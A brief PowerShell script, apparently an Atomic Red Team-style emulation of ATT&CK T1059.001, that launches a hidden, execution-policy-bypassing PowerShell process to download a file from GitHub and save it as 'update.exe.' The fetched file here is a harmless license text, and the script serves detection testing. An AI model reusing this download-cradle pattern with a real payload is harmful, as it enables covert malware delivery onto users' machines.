# MITRE ATT&CK T1059.001 - Malicious PowerShell Execution
# Emulating an Atomic Red Team fileless download cradle using production-bypass flags.

Write-Host "[*] Simulating execution of a malicious PowerShell downloader..."

# Exact command executed on the Windows 10 Victim Machine:
# powershell.exe -Exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/RedCanaryCo/AtomicRedTeam/master/LICENSE.txt -OutFile C:\temp\update.exe"

Start-Process powershell.exe -ArgumentList '-Exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/RedCanaryCo/AtomicRedTeam/master/LICENSE.txt -OutFile C:\temp\update.exe"'
